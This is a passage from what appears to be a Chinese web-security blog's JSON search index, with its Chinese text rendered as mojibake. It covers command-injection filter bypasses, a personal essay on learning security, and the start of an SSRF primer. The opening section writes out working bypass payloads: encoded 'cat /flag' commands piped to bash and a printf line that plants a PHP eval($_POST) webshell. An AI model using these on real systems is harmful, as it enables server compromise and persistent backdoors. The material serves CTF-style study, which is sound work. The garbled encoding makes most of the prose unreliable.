| xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag octï¼š 12345$(printf &quot;\\154\\163&quot;) &#x3D;&#x3D;&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; 1.php å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ 1ca&#39;&#39;t flag æˆ– 1ca&quot;&quot;t flag åæ–œæ ç»•è¿‡ 1ca\\t fla\\g Shellç‰¹æ®Šå˜é‡ç»•è¿‡ å˜é‡ å«ä¹‰ $0 å½“å‰è„šæœ¬çš„æ–‡ä»¶å $n ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚ $# ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•° $* ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚ $@ ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å«æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ $? ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ $$ å½“å‰shellè¿›ç¨‹ID æ¯”å¦‚ï¼šca$@t fla$@g é•¿åº¦é™åˆ¶ https://www.freebuf.com/articles/web/154453.html çœ‹è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å¯¹*vä¸ºä»€ä¹ˆç­‰ä»·äºrev vå¾ˆç–‘æƒ‘ï¼Œåæ¥çŸ¥é“äº†Bash æ¥æ”¶åˆ°å‘½ä»¤ä»¥åï¼Œå‘ç°é‡Œé¢æœ‰é€šé…ç¬¦ï¼Œä¼šè¿›è¡Œé€šé…ç¬¦æ‰©å±•ï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯*vå…ˆæ‰©å±•ä¸ºrev vç„¶åå†æ‰§è¡Œã€‚ é€šé…ç¬¦ æœ‰å…³å‘½ä»¤é€šé…ç¬¦çš„æ•™ç¨‹ï¼šhttp://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://ca0y1h.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©","date":"2019-12-31T13:15:19.000Z","path":"Essay/ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©/","text":"ä»0åˆ°100åˆ†çš„å­¦ä¹ å¿ƒå¾— å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ca01hï¼Œä»Šå¹´8æœˆä»½åŠ å…¥äº†ä¿¡å®‰ä¹‹è·¯å°ç™½æˆé•¿è®¡åˆ’ï¼Œ5ä¸ªæœˆçš„æ—¶é—´è¿‡å»ï¼Œå¾ˆæ„å¤–åœ°æˆä¸ºäº†ç¾¤é‡Œç¬¬ä¸€ä¸ªåˆ°è¾¾100åˆ†çš„ç”·äººã€‚çº¸é¢ä¸Šæ¥çœ‹æ˜¯0åˆ°100åˆ†çš„å˜åŒ–ï¼Œè€Œå¯¹æˆ‘è‡ªå·±è€Œè¨€ï¼Œæ„å‘³ç€ç»ˆäºè·¨å…¥äº†Webå®‰å…¨çš„é¢†åŸŸï¼Œä¹Ÿç®—æ˜¯èå…¥äº†ä¸€ä¸ªå®‰å…¨çš„åœˆå­ã€‚ä¸æ­¤åŒæ—¶ï¼Œå¾ˆè£å¹¸æ¥åˆ°è‰¯å“¥çš„é‚€è¯·ï¼Œä¸ºå¹³å°çš„å…¶ä»–å°ä¼™ä¼´ä»¬å†™ä¸€å†™è¿™å‡ ä¸ªæœˆå­¦ä¹ æˆé•¿è¿‡ç¨‹æœŸé—´çš„ç»éªŒä¹‹è°ˆï¼Œåˆšå¥½æˆ‘ä¹Ÿå‡†å¤‡ç»™è‡ªå·±åšä¸€ä¸ªé˜¶æ®µæ€§çš„æ€»ç»“ä»¥åŠå¯¹æœªæ¥çš„çŸ­æœŸè§„åˆ’ï¼Œé‚æ¬£ç„¶æ¥å—ã€‚ä½†çœŸæ­£åˆ°äº†æç¬”æ’°æ–‡çš„æ—¶å€™ï¼Œé™¤äº†å…´å¥‹ä¹‹å¤–äº¦æœ‰äº›æƒ¶æï¼Œæƒ¶ææ˜¯å› ä¸ºæ„Ÿè§‰è‡ªå·±èµ„è´¨å°šæµ…ä¸è¶³ä»¥æ”¯æ’‘ä¸€ç¯‡ç»éªŒè´´ï¼Œç›´ç™½ç‚¹å°±æ˜¯å¤ªèœäº†ï¼Œè¿˜æœ‰å¤ªå¤šå¤ªå¤šçš„çŸ¥è¯†é¢ã€æŠ€èƒ½è¡¨ã€å¥‡æŠ€æ·«å·§éœ€è¦æŒ–æ˜å’Œå­¦ä¹ ï¼Œä½†æ—¢ç„¶å·²ç»ç­”åº”äº†è‰¯å“¥ï¼Œæ— è®ºå¦‚ä½•ç¡¬ç€å¤´çš®éƒ½è¦å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚å½“ç„¶ï¼Œè¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯é¢å‘å¹³å°çš„å…¶ä»–å°ä¼™ä¼´ä»¬ï¼Œæœ›å€Ÿæ‹™ç¬”æµ…æ–‡ï¼Œä¸å¤§å®¶åˆ†äº«ã€‚ 4ä¸ªå¤šæœˆçš„æ—¶é—´100åˆ†ï¼Œå®Œæˆ11ä¸ªä»»åŠ¡ï¼Œå¹³å‡ä¸‹æ¥æ¯ä¸ªä»»åŠ¡å¾—9åˆ†å·¦å³ï¼Œä¹Ÿåªèƒ½æ˜¯ä¸­è§„ä¸­çŸ©å§ï¼Œä¸ç®—ä¼˜ç§€ã€‚ç°åœ¨å›æƒ³èµ·æ¥ï¼Œåšå‰é¢å‡ ä¸ªä»»åŠ¡çš„æ—¶å€™è¿˜æ²¡æœ‰æ‘¸åˆ°é—¨é“ï¼Œæ˜¯æ¯”è¾ƒç®€å•æœºæ¢°çš„æ¬è¿å·¥ï¼Œç»è¿‡å‡ ä¸ªæœˆçš„å­¦ä¹ ç®—æ˜¯æœ‰ç‚¹ä¸Šé“äº†ï¼Œæœ‰äº†è‡ªå·±çš„å®è·µæ“ä½œï¼ŒåŠ ä¸Šäº†è‡ªå·±å¯¹è¿™ä¸ªç±»å‹æ¼æ´çš„ç†è§£å’Œæ€»ç»“ã€‚åˆ°äº†åé¢ç»å¸¸ä¸¤ä¸ªæ˜ŸæœŸæ‰èƒ½å®Œæˆä¸€ä¸ªæŠ¥å‘Šï¼Œä¼šåœ¨äº‘æœåŠ¡å™¨ä¸Šè‡ªå·±æ­å»ºçš„æ¼æ´ç¯å¢ƒå› ä¸ºæŸä¸ªé—®é¢˜è€Œçº ç¼ åŠå¤©ï¼Œä¹Ÿä¼šä¸ºäº†å¤§ç‰›çš„åšå®¢ä¸Šè½»è½»å¸¦è¿‡çš„ä¸€å¥è¯è€Œæ·±ç©¶èƒŒåçš„åŸç†ã€‚æ˜¯çš„ï¼Œä¸€ç¯‡æŠ¥å‘Šä¸ä»…ä»…æ˜¯æ—¶é—´å †ç Œå‡ºæ¥çš„ï¼Œæ›´éœ€è¦ç”¨å¿ƒå»ä¹¦å†™å’Œç†è§£ï¼Œç”¨æ‰‹å»åšå®éªŒå¾—ç»“æœã€‚å°±æ‹¿æœ€è¿‘ä¸€ç¯‡å…³äºSSRFæ¼æ´çš„æŠ¥å‘Šæ¥è¯´ï¼Œæˆ‘é¦–å…ˆä»ã€ŠWebå®‰å…¨æ”»é˜²ã€‹è¿™æœ¬ä¹¦å‡ºå‘ï¼Œåªæœ‰å¯¥å¯¥æ•°é¡µï¼Œæ¯”è¾ƒç²—ç•¥çš„è®²äº†å®ƒçš„åŸç†ã€å¯åˆ©ç”¨çš„åœ°æ–¹ä»¥åŠç®€å•çš„ä»£ç åˆ†æï¼Œçœ‹å®Œä¹‹åæ„çŠ¹æœªå°½æ„Ÿè§‰è¿œè¿œä¸å¤Ÿï¼Œäºæ˜¯Googleæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œè¿™ä¸ªåšæ–‡ç›¸å¯¹äºä¹¦ç±æ¥è¯´å·²ç»å¾ˆå……å®äº†ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶ã€åˆ©ç”¨æ–¹å¼ã€å®é™…åˆ©ç”¨ã€Bypassç­‰ç­‰éƒ½æ¯”è¾ƒè¯¦ç»†ï¼Œå¯¹äºæˆ‘æ¥è¯´æ¬£å–œä¸å·²ï¼Œé‚è®¤çœŸå“è¯»èµ·æ¥ï¼Œçœ‹å®Œè¿™ç¯‡æ–‡ç« ç¡®å®ç»™äº†æˆ‘ä¸€ä¸ªå¯¹äºSSRFæ¼æ´æ¯”è¾ƒå…¨é¢çš„è®¤çŸ¥ã€‚ä½†å®è·µå‡ºçœŸçŸ¥ï¼Œåˆ°æˆ‘çœŸæ­£å»å¤ç°ä¸€äº›ç»†èŠ‚çš„æ—¶å€™ï¼Œä¸Šé¢å´æ²¡æœ‰æåˆ°å¤ªå¤šï¼Œæœ‰çš„ç”šè‡³ä¸€ç¬”å¸¦è¿‡ï¼Œä½†æˆ‘è‚¯å®šä¸èƒ½å°±æ­¤æ•·è¡è¿‡å»ï¼Œåˆæ‰¾äº†å¾ˆå¤šå…¶ä»–çš„èµ„æ–™ï¼Œä¸æ–­åœ°æ‰©å……è‡ªå·±çš„æŠ¥å‘Šçš„ç»†èŠ‚ï¼Œè§£å†³é—®é¢˜çš„æ–¹æ³•è‚¯å®šä¸æ­¢ä¸€ç§ï¼Œæœ‰çš„æ˜¯ç”¨ç°æˆå·¥å…·å’Œå‘½ä»¤æ¥ç”Ÿæˆpayloadï¼Œè€Œæœ‰çš„æ˜¯è‡ªå·±æˆªè·æµé‡ç»è¿‡ä¸€ç³»åˆ—æ‰‹æ®µæ¥æ„é€ payloadã€‚å¹¶ä¸æ˜¯è¯´ç›´æ¥ç”¨å·¥å…·ä¸å¥½ï¼Œè€Œæ˜¯å¯¹è‡ªå·±çš„æˆé•¿ä½œç”¨ä¸å¤§ï¼Œå¯ä»¥ä½œä¸ºå‚è€ƒï¼Œä½†ç»éæœ€ä¼˜ã€‚å½“ç„¶ï¼Œæˆ‘è‡ªå·±è¿˜æ˜¯è§‰å¾—ä¹‹å‰åšçš„è¿˜æ˜¯æœ‰äº›ä¸è¶³ï¼Œæ¯”å¦‚ç¼ºå°‘ä¸€äº›æ¼æ´çš„å®ä¾‹ï¼Œå°±æ‹¿SSRFæ¥è¯´ï¼Œæˆ‘æœ€è¿‘çœ‹åˆ°ä¸€ç¯‡æ–‡ç« Vimeo upload function SSRFï¼Œæ‰“ç®—åŠ¨æ‰‹æ¥è¯•ä¸€è¯•ï¼Œä¹Ÿç®—æ˜¯å†ä¸€æ¬¡åŠ æ·±å°è±¡å’Œç†è§£ã€‚æ€»çš„æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªåˆå­¦è€…è€Œè¨€ï¼Œå­¦ä¹ æ— éå°±æ˜¯å‘ç°é—®é¢˜ã€æŸ¥æ‰¾é—®é¢˜ã€è§£å†³é—®é¢˜ï¼Œæœ€åçš„ç»“æœå–å†³äºè¿™ä¸ªè¿‡ç¨‹ï¼Œè€Œè¿™ä¸ªè¿‡ç¨‹åˆå–å†³äºä½ å¯¹å®ƒçš„æ€åº¦ã€‚ ä¸Šé¢ç®€å•çš„è°ˆäº†ä¸€ä¸‹è¿™æ®µæ—¶é—´æˆ‘åœ¨å†™æŠ¥å‘Šæ—¶å€™çš„ä¸€äº›æ„Ÿå—å’Œæƒ³æ³•ï¼Œæ—¢ç„¶ä½œä¸ºåˆ†äº«ï¼Œæˆ‘å°±æƒ³åˆ†äº«çš„æ›´ä¸ºæè‡´ä¸€äº›ï¼Œæ¥ç€è¯´ä¸€è¯´æˆ‘è‡ªå·±ç›®å‰å­¦ä¹ æœŸé—´çš„ä¸€äº›æ–¹æ³•è®ºã€‚ é¦–å…ˆï¼Œæˆ‘è®¤ä¸ºéœ€è¦ä¸€ä¸ªçŸ¥è¯†åº“ã€‚ç°åœ¨æ˜¯ç¢ç‰‡åŒ–æ—¶ä»£ï¼Œç”Ÿæ´»ä¸­å……æ–¥ç€ç¢ç‰‡åŒ–çš„æ—¶é—´ã€ç¢ç‰‡åŒ–çš„å†…å®¹ã€ç¢ç‰‡åŒ–çš„çŸ¥è¯†ç­‰ç­‰ï¼Œè¿™è®©æˆ‘ä»¬æ²¡æœ‰å¤§æ®µçš„ä¸“æ³¨æ—¶é—´ï¼Œä¸€ç§æ¯”è¾ƒå¥½çš„è§£å†³æ–¹å¼æ˜¯ä½“ç³»åŒ–ã€æ–‡æ¡£åŒ–ã€æ•°å­—åŒ–æ¢³ç†å’Œæ€»ç»“çŸ¥è¯†ï¼Œç®¡ç†å­¦ä¹ ï¼ŒåŠ æ·±ç†è§£ã€‚æ¯”å¦‚æˆ‘è‡ªå·±æ­äº†ä¸€ä¸ªç®€å•çš„ä¸ªäººWikiç½‘ç«™ï¼Œç”¨æ¥æ”¶å½•æ•´ç†æ–‡ç« ï¼Œåˆ†å—ç®¡ç†ï¼Œä¾¿äºæŸ¥é˜…æ¸©æ•…ã€‚ä¹Ÿå¹¶ä¸æ˜¯è¯´éè¦æ­å»ºä¸€ä¸ªåšå®¢ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå¯ä»¥åˆ†äº«è®°å½•çš„ç½‘ç«™ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œæ–‡æ¡£åŒ–ç³»ç»ŸåŒ–æ˜¯ç”¨æ¥è®°å½•ç¢ç‰‡åŒ–æ—¶é—´çš„æ‰€å­¦æ‰€æ€æœ€å¥½çš„åŠæ³•ã€‚ å…¶æ¬¡ï¼Œè®¡ç®—æœºè¿™é—¨å­¦ç§‘æ—¥ç›Šæ›´æ–°ï¼Œä¿¡å®‰å°¤å…¶å¦‚æ­¤ï¼Œè™½ç„¶ä½œä¸ºåˆå­¦è€…ï¼Œä½†æˆ‘è¿˜æ˜¯è§‰å¾—è¦æ¥è§¦ä¸€äº›å‰æ²¿çš„çŸ¥è¯†å’Œæ–°é—»ï¼Œè¿™æ ·æ‰èƒ½åœ¨å­¦ä¹ åŸç†çš„æ—¶å€™èƒ½ä¸Šæ‰‹ä½“éªŒä¸€ä¸‹çœŸå®æ¡ˆä¾‹ã€‚æˆ‘æ¨èå‡ ä¸ªæˆ‘ä¸ªäººæ­£åœ¨ä½¿ç”¨çš„ä¿¡æ¯æºï¼Œä¸€æ˜¯è…¾è®¯ç„æ­¦å®éªŒå®¤å’Œå¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤ï¼Œå®ƒä»¬æ¯å¤©éƒ½ä¼šåˆ†äº«æ¯”è¾ƒæ–°æ¯”è¾ƒä¼˜ç§€çš„æ–‡ç« ï¼ŒåŒ…æ‹¬å…·ä½“æŠ€æœ¯ã€æœ€æ–°æ¼æ´ã€æ¶æ„ä»£ç ã€å·¥å…·ä½¿ç”¨ç­‰ç­‰ï¼Œä¸Šé¢æåˆ°çš„é‚£ç¯‡å…³äºVimeoçš„SSRFä¸Šä¼ æ¼æ´å°±æ˜¯å‰å‡ å¤©æµè§ˆçœ‹åˆ°çš„ã€‚æˆ‘è§‰å¾—è¿™ç§å½¢å¼è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œä¹Ÿä¸ç”¨å…¨ç›˜æ¥æ”¶ï¼Œæ¯”è¾ƒé«˜æ•ˆåœ°è·å–çŸ¥è¯†ï¼Œå°±çœ‹çœ‹æ˜¯å¦æœ‰å…³äºè‡ªå·±æ­£åœ¨åšçš„å·¥ä½œçš„æ–‡ç« æˆ–è€…æ„Ÿå…´è¶£çš„çŸ¥è¯†ç‚¹ï¼Œè®°å½•ä¸‹æ¥ã€‚æ­¤å¤–ï¼Œå¤§ä½¬çš„åšå®¢ä¹Ÿå¯ä»¥æ—¶å¸¸å…³æ³¨ï¼Œæ¯”å¦‚è¯´Pç‰›ã€c0ny1ã€Knownsecã€404 not foundç­‰ç­‰ç­‰ï¼Œå†æ­¤å°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚é‚£ä¹ˆæœ‰çš„åŒå­¦å°±ä¼šé—®ï¼Œéœ€è¦æ¯å¤©å»ä»–ä»¬çš„åšå®¢æµè§ˆä¸€éçœ‹æœ‰æ²¡æœ‰å‘æ–°æ–‡ç« å—ï¼Ÿå…¶å®ä¹Ÿç”¨ä¸ç€ï¼ŒChromeæœ‰ä¸€ä¸ªæ‰©å±•æ’ä»¶å«RSS Feed Readerç”¨æ¥æ•´åˆRSSè®¢é˜…ï¼Œå¦‚æœå‘å¸ƒäº†æ–°æ–‡ç« å®ƒå°±ä¼šæœ‰ç›¸åº”çš„æé†’ï¼Œå¾ˆæ–¹ä¾¿ã€‚ å†è€…ï¼ŒCTFç¡®å®æ˜¯å­¦ä¹ Webå®‰å…¨çš„å¥½é€”å¾„ã€‚æˆ‘åœ¨11æœˆä»½çš„æ—¶å€™å’Œå¾ˆå‰å®³çš„å¸ˆå…„ä¸€èµ·å‚åŠ äº†æ ¡èµ›NCTFï¼Œè™½ç„¶è¢«è™å‡ºç¿”äº†ï¼Œè¿™ä¸ªç»å†å›æƒ³èµ·æ¥ä¹Ÿå¾ˆå¿ƒç—›ï¼Œä½†åœ¨æ‰“æ¯”èµ›çš„æ—¶å€™è§£å‡ºé¢˜ç›®æ˜¯å­¦ä¹ æ–°çŸ¥è¯†çš„æœ€å¤§åŠ¨åŠ›ï¼Œä¹Ÿæ˜¯æ£€éªŒè‡ªå·±èƒ½åŠ›çš„ä¸€ç§æ–¹å¼ã€‚è‡³äºå…³äºCTFæ–¹é¢ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è®²äº†ï¼Œæ˜Ÿçƒä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºCTFçš„æ–‡ç« ï¼Œéƒ½å¯ä»¥å‚è€ƒå‚è€ƒã€‚ è¿™åŠå¹´æ¥çš„å­¦ä¹ ç»éªŒä¹Ÿå·®ä¸å¤šè¨€å°½äºæ­¤äº†ã€‚ç°åœ¨æƒ³æƒ³è‡ªå·±ä¸ºä»€ä¹ˆå¤´é“ä¸¤æ¬¡è€ƒç ”éè¦é€‰æ‹©è¿™ä¸€è¡Œï¼Œåå€’æœ‰äº›é“ä¸æ¸…åŸå› äº†ã€‚æœ¬ç§‘çš„æ—¶å€™ä¹Ÿæ˜¯åšä¿¡å®‰çš„ï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯æ”¾åœ¨äº†Linuxç³»ç»Ÿå†…æ ¸å®‰å…¨åŠ å›ºæ–¹é¢ï¼Œä¹Ÿåšå‡ºäº†äº›ä¸œè¥¿é¡ºå¸¦æ‹¿äº†ä¸ªå›½å¥–ã€‚å¯èƒ½æ˜¯æ„Ÿè§‰åº•å±‚è¿™ä¸€å—è¿˜æ˜¯ä¸å¤ªé€‚åˆæˆ‘ï¼Œæœ‰äº›åŠ›ä¸ä»å¿ƒäº†ï¼Œæˆ–è€…è§‰å¾—è¿™ä¸ªæ–¹å‘çš„å°±ä¸šé¢å¤ªçª„äº†ï¼Œå½“æ—¶æ°å¥½æœ‰ä¸€ä½å­¦é•¿æ˜¯æwebå®‰å…¨çš„ï¼Œåœ¨æˆ‘é¢å‰æ¼”ç¤ºäº†ä¸€æŠŠæ‹¿åˆ°æŸä¸ªåå°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼Œçœ‹ç€ä»–æ‰“äº†å‡ åœºCTFæ¯”èµ›ï¼Œä¹Ÿè®¸çœŸçš„æ˜¯å…´è¶£ä½¿ç„¶ï¼Œæ°å¥½åˆ°äº†è€ƒç ”çš„å‡†å¤‡çš„é˜¶æ®µï¼Œäºæ˜¯å°±ä¸‹å®šå†³å¿ƒè¯»ç ”è½¬Webå®‰å…¨æ–¹å‘ã€‚è™½ç„¶æœ‰äº›åå·ï¼Œç°åœ¨ä¹Ÿç®—æ˜¯ååœ¨è¿™ä¸ªä½ç½®ä¸Šäº†ï¼Œä½†ä¹Ÿæ­£æ˜¯åˆ°äº†æ›´é«˜çš„å¹³å°ä¸Šï¼Œæ‰å‘ç°è‡ªå·±å…¥è¡Œå¤ªæ™šäº†ã€‚ç›¸æ¯”è€Œè¨€ï¼Œå­¦å¼Ÿå­¦å¦¹ä»¬å¤§ä¸€å¤§äºŒå°±å…¥äº†é—¨ï¼Œä¼˜ç§€ä¸€ç‚¹çš„éƒ½å·²ç»æ‹¿äº†ä¸å°‘çº¿ä¸‹æ”»é˜²å¤§èµ›çš„ä¸€ç­‰å¥–ã€ç¬¬ä¸€åï¼Œæš‘å‡å»å¤§å‚å®ä¹ ã€‚åƒæˆ‘è¿™ç§å¤§é¾„é€‰æ‰‹å·²ç»æ²¡æ³•æ¯”äº†ï¼Œè‡ªå·±åœ¨å­¦ä¹ çš„æ—¶å€™åˆ«äººä¹Ÿåœ¨å­¦ï¼Œå”¯ä¸€çš„é€‰æ‹©å°±æ˜¯èŠ±æ›´å¤šçš„æ—¶é—´ï¼Œä¸‹æ›´å¤§çš„åŠŸå¤«ã€‚è®²çœŸï¼Œè™½è¯´é—æ†¾ï¼Œä½†ä¹Ÿæ— æ‚”ã€‚ è¯´åˆ°è¿™é‡Œï¼Œä¸€èˆ¬éƒ½åˆ°äº†ç«‹flagçš„æ—¶é—´ï¼Œæˆ‘ä¹Ÿä¸ä¾‹å¤–ï¼Œæ˜å¤©å°±æ˜¯2020å¹´äº†ï¼Œæ–°çš„ä¸€å¹´åšä¸ªçŸ­æœŸè§„åˆ’ä¹Ÿæ˜¯æŒºä¸é”™çš„ã€‚å¯¹äºWebå®‰å…¨è¿™æ¡è·¯ï¼Œæˆ‘åŠ å…¥ä¹‹å‰è¿™ä¸ªå¹³å°ä¹‹å‰ï¼Œä¹Ÿå¾ˆæƒ³å­¦Webå®‰å…¨ï¼Œä¹Ÿåœ¨å„å¤§è®ºå›çœ‹äº†ä¸å°‘çš„ç»éªŒè´´ï¼Œä½†è¯´åˆ°åº•è¿˜æ˜¯åˆ«äººçš„ç»éªŒï¼Œæˆ‘ä¸çŸ¥é“æˆ‘è¦å­¦ä»€ä¹ˆï¼Œç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆæ ·èµ°ä¸‹å»ï¼Œè¿™äº›éƒ½éå¸¸åœ°å›°æƒ‘æˆ‘ã€‚ç°åœ¨ï¼Œæˆ‘ä¼šç»§ç»­è·Ÿç€è‰¯å“¥çš„è®¡åˆ’èµ°ï¼Œåœ¨å¹´åº•ä¹‹å‰å®Œæˆwebå®‰å…¨çš„å‰©ä½™ä»»åŠ¡ï¼ŒåŒæ—¶å¼€å¯æ¸—é€æµ‹è¯•çš„æ–°ç¯‡ç« ï¼Œä»¥æŸä¸ªSRCä¸ºç›®æ ‡ä½“éªŒæ¸—é€çš„è¿‡ç¨‹ã€‚åœ¨æ­¤æœŸé—´ï¼Œæˆ‘ä¹Ÿä¼šåœ¨å‰æœŸè¯•ç€çœ‹ä¸€äº›ç°æœ‰çš„æ•™ç¨‹ç©ä¸€ç©Hack the boxé¶æœºï¼Œæ¯•ç«Ÿåœ¨å½“å‰çš„æ³•å¾‹æ³•è§„é¢å‰ï¼Œæ‰“é¶æœºè¿˜æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚å¦å¤–è¿˜æœ‰æ›´é‡è¦çš„ä¸€æ¡è·¯çº¿å°±æ˜¯æ¼æ´æŒ–æ˜ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯ä»£ç å®¡è®¡ï¼‰+æœºå™¨å­¦ä¹ ï¼Œæ¯•ç«Ÿæ˜¯è¦å‡ºè®ºæ–‡çš„ï¼Œå•ç‹¬ä¸€ä¸ªWebå®‰å…¨å†™ä¸å‡ºä»€ä¹ˆå¤ªå¤šçš„èŠ±æ ·ï¼Œå¸Œæœ›è‡ªå·±èƒ½ç»“åˆå½“å‰æ¯”è¾ƒç«çƒ­çš„MLã€DLç­‰ä½œä¸ºè‡ªå·±æ—¥åçš„ç ”ç©¶æ–¹å‘ï¼Œç›®å‰åœ¨çœ‹å´æ©è¾¾è€å¸ˆçš„æœºå™¨å­¦ä¹ è¯¾ç¨‹ï¼Œå­¦å®Œäº†åŸºç¡€çŸ¥è¯†å†å»ç ”ç©¶å…·ä½“çš„å·¥ä½œã€‚è¦æ˜¯å“ªä½å¤§ä½¬æ­£åœ¨æè¿™ä¸ªï¼Œå¸Œæœ›èƒ½å¸¦å¸¦å°å¼Ÿå…±åŒäº¤æµã€‚ å¥½äº†ï¼Œæ–‡ç« çš„æœ€åï¼Œå°±ç”¨ä¸€å¥è¯ä¸å°ä¼™ä¼´ä»¬å…±å‹‰ï¼šå­¦ä¹ ä¹‹è·¯ï¼Œé“é˜»ä¸”é•¿ï¼Œä¸Šä¸‹æ±‚ç´¢ã€‚","tags":[{"name":"ç»éªŒ","slug":"ç»éªŒ","permalink":"http://ca0y1h.top/tags/%E7%BB%8F%E9%AA%8C/"}],"categories":[{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"http://ca0y1h.top/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹SSRFæ¼æ´åˆ©ç”¨","date":"2019-12-17T11:34:00.000Z","path":"Web_security/basic_learning/17.SSRFæ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹SSRFæ¼æ´åˆ©ç”¨ ä»€ä¹ˆæ˜¯ssrf SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚ ç®€å•æ¥è®²å°±æ˜¯ï¼ŒæœåŠ¡å™¨ä¼šå“åº”ç”¨æˆ·çš„urlè¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰åšå¥½è¿‡æ»¤å’Œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥æ”»å‡»å†…ç½‘ã€‚ æ¼æ´äº§ç”Ÿ ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç”¨æˆ·å¯æ§çš„ç›®æ ‡åœ°å€åšè¿‡è™‘ä¸é™åˆ¶ã€‚ åœ¨PHPä¸­çš„curl()ï¼Œfile_get_contents()ï¼Œfsockopen()ç­‰å‡½æ•°æ˜¯å‡ 